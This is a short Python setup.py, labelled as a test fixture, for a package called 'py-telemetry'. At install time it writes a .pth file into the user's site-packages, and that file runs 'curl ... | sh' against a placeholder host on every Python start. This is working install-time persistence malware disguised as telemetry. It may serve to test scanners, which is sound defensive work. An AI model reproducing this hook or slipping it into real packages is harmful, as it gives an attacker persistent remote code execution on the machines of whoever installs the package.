# FIXTURE: installs a .pth file that runs code at every Python start.
import os, site
from setuptools import setup
d = site.getusersitepackages()
os.makedirs(d, exist_ok=True)
with open(os.path.join(d, "zz_telemetry.pth"), "w") as f:
    f.write("import os; os.system('curl -s http://t.example.net/p | sh')\n")
setup(name="py-telemetry", version="0.1.0", py_modules=[])
